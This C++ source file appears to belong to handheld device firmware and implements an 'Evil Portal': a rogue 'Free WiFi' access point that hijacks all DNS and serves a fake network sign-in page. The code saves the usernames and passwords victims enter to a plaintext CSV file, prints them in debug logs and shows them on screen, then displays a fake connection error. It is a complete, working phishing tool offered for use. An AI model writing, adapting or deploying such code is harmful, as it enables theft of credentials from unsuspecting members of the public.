#include "CaptivePortalActivity.h"

#include <HalStorage.h>
#include <I18n.h>
#include <Logging.h>
#include <WiFi.h>

#include <string>

#include "MappedInputManager.h"
#include "activities/util/KeyboardEntryActivity.h"
#include "components/UITheme.h"
#include "fontIds.h"
#include "util/RadioManager.h"

// Built-in default portal page
static const char BUILTIN_HTML[] = R"rawhtml(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title><style>
*{box-sizing:border-box}body{font-family:-apple-system,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.c{background:#fff;padding:32px;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.1);width:90%;max-width:400px}
h2{margin:0 0 8px;color:#1a1a1a}p{color:#666;margin:0 0 24px;font-size:14px}
input{width:100%;padding:14px;margin:0 0 12px;border:1px solid #ddd;border-radius:8px;font-size:16px}
button{width:100%;padding:14px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
</style></head><body><div class="c"><h2>Connect to Internet</h2>
<p>Sign in to access the network</p>
<form method="POST" action="/login">
<input name="username" placeholder="Email or username" required autocomplete="off">
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign In</button></form></div></body></html>)rawhtml";

static const char RESPONSE_HTML[] =
    "<html><body><h2>Connection Error</h2><p>Unable to connect. Please try again later.</p></body></html>";

static CaptivePortalActivity* portalInstance = nullptr;
static constexpr const char* BUILTIN_NAME = "(Built-in) WiFi Login";

void CaptivePortalActivity::onEnter() {
  Activity::onEnter();
  RADIO.ensureWifi();
  state = SELECT_TEMPLATE;
  templates.clear();
  selectorIndex = 0;
  capturedCount = 0;
  lastUsername.clear();
  lastPassword.clear();
  portalInstance = this;
  Storage.mkdir("/biscuit");
  Storage.mkdir("/biscuit/portals");
  loadTemplates();
  requestUpdate();
}

void CaptivePortalActivity::onExit() {
  Activity::onExit();
  stopPortal();
  portalInstance = nullptr;
  RADIO.shutdown();
}

void CaptivePortalActivity::loadTemplates() {
  templates.clear();
  templates.push_back(BUILTIN_NAME);  // always first

  auto dir = Storage.open("/biscuit/portals");
  if (!dir || !dir.isDirectory()) { if (dir) dir.close(); return; }

  char name[128];
  for (auto file = dir.openNextFile(); file; file = dir.openNextFile()) {
    if (!file.isDirectory()) {
      file.getName(name, sizeof(name));
      std::string fname(name);
      if (fname.size() > 5 && fname.substr(fname.size() - 5) == ".html") {
        templates.push_back(fname);
      }
    }
    file.close();
  }
  dir.close();
}

void CaptivePortalActivity::startPortal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSsid.c_str());
  delay(100);

  dnsServer = std::make_unique<DNSServer>();
  dnsServer->start(53, "*", WiFi.softAPIP());

  webServer = std::make_unique<WebServer>(80);
  webServer->on("/", HTTP_GET, [this]() { handleRoot(); });
  webServer->on("/login", HTTP_POST, [this]() { handleLogin(); });
  webServer->onNotFound([this]() { handleNotFound(); });
  webServer->begin();

  state = RUNNING;
  LOG_DBG("PORTAL", "Portal started: %s", apSsid.c_str());
}

void CaptivePortalActivity::stopPortal() {
  if (webServer) { webServer->stop(); webServer.reset(); }
  if (dnsServer) { dnsServer->stop(); dnsServer.reset(); }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
}

void CaptivePortalActivity::handleRoot() {
  // Serve built-in or custom template
  if (selectedTemplate == BUILTIN_NAME) {
    webServer->send(200, "text/html", BUILTIN_HTML);
    return;
  }
  std::string path = "/biscuit/portals/" + selectedTemplate;
  auto file = Storage.open(path.c_str());
  if (!file) { webServer->send(200, "text/html", BUILTIN_HTML); return; }

  size_t fileLen = file.size();
  webServer->setContentLength(fileLen);
  webServer->send(200, "text/html", "");
  static uint8_t buf[512];
  while (file.available()) {
    int n = file.read(buf, sizeof(buf));
    if (n <= 0) break;
    webServer->sendContent(reinterpret_cast<const char*>(buf), n);
  }
  file.close();
}

void CaptivePortalActivity::handleLogin() {
  std::string username = webServer->arg("username").c_str();
  std::string password = webServer->arg("password").c_str();

  if (!username.empty()) {
    logCredentials(username, password);
    capturedCount++;
    lastUsername = username;
    lastPassword = password;
    requestUpdate();
  }
  webServer->send(200, "text/html", RESPONSE_HTML);
}

void CaptivePortalActivity::handleNotFound() {
  webServer->sendHeader("Location", "http://192.168.4.1/", true);
  webServer->send(302, "text/plain", "");
}

void CaptivePortalActivity::logCredentials(const std::string& username, const std::string& password) {
  Storage.mkdir("/biscuit");
  const char* logPath = "/biscuit/creds.csv";
  bool exists = Storage.exists(logPath);
  auto file = Storage.open(logPath, O_WRITE | O_CREAT | O_APPEND);
  if (!file) return;
  if (!exists) file.println("timestamp,ssid,username,password");
  String line = String(millis()) + "," + apSsid.c_str() + "," + username.c_str() + "," + password.c_str();
  file.println(line);
  file.close();
  LOG_DBG("PORTAL", "Captured: %s / %s", username.c_str(), password.c_str());
}

void CaptivePortalActivity::loop() {
  if (state == RUNNING) {
    dnsServer->processNextRequest();
    webServer->handleClient();
    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
      stopPortal(); state = STOPPED; requestUpdate();
    }
    return;
  }

  if (state == STOPPED) {
    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) finish();
    return;
  }

  if (state == SELECT_TEMPLATE) {
    const int count = static_cast<int>(templates.size());
    buttonNavigator.onNext([this, count] { if (count > 0) { selectorIndex = ButtonNavigator::nextIndex(selectorIndex, count); requestUpdate(); } });
    buttonNavigator.onPrevious([this, count] { if (count > 0) { selectorIndex = ButtonNavigator::previousIndex(selectorIndex, count); requestUpdate(); } });

    if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
      if (!templates.empty()) {
        selectedTemplate = templates[selectorIndex];
        state = ENTER_SSID;
        startActivityForResult(
            std::make_unique<KeyboardEntryActivity>(renderer, mappedInput, "AP Name", "Free WiFi", 32),
            [this](const ActivityResult& result) {
              if (result.isCancelled) { state = SELECT_TEMPLATE; requestUpdate(); return; }
              apSsid = std::get<KeyboardResult>(result.data).text;
              if (apSsid.empty()) apSsid = "Free WiFi";
              startPortal();
              requestUpdate();
            });
      }
    }
    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) finish();
    return;
  }
}

void CaptivePortalActivity::render(RenderLock&&) {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();

  renderer.clearScreen();
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Evil Portal");

  if (state == RUNNING || state == STOPPED) {
    const int leftPad = metrics.contentSidePadding;
    int y = metrics.topPadding + metrics.headerHeight + 30;
    const int lineH = 45;

    renderer.drawText(SMALL_FONT_ID, leftPad, y, state == RUNNING ? "ACTIVE" : "Stopped", true, EpdFontFamily::BOLD);
    y += lineH;
    renderer.drawText(SMALL_FONT_ID, leftPad, y, "SSID:", true, EpdFontFamily::BOLD);
    renderer.drawText(UI_10_FONT_ID, leftPad + 60, y, apSsid.c_str());
    y += lineH;

    std::string clientsStr = "Clients: " + std::to_string(WiFi.softAPgetStationNum());
    renderer.drawText(UI_10_FONT_ID, leftPad, y, clientsStr.c_str());
    y += lineH;

    std::string captStr = "Captured: " + std::to_string(capturedCount);
    renderer.drawText(UI_10_FONT_ID, leftPad, y, captStr.c_str(), true, EpdFontFamily::BOLD);
    y += lineH;

    if (!lastUsername.empty()) {
      renderer.drawText(UI_10_FONT_ID, leftPad, y, ("User: " + lastUsername).c_str());
      y += lineH;
      renderer.drawText(UI_10_FONT_ID, leftPad, y, ("Pass: " + lastPassword).c_str());
    }

    const auto labels = mappedInput.mapLabels("Stop", "", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  // SELECT_TEMPLATE
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int contentHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
  GUI.drawList(renderer, Rect{0, contentTop, pageWidth, contentHeight},
      static_cast<int>(templates.size()), selectorIndex,
      [this](int i) -> std::string { return templates[i]; }, nullptr);

  const auto labels = mappedInput.mapLabels("Back", "Select", "^", "v");
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
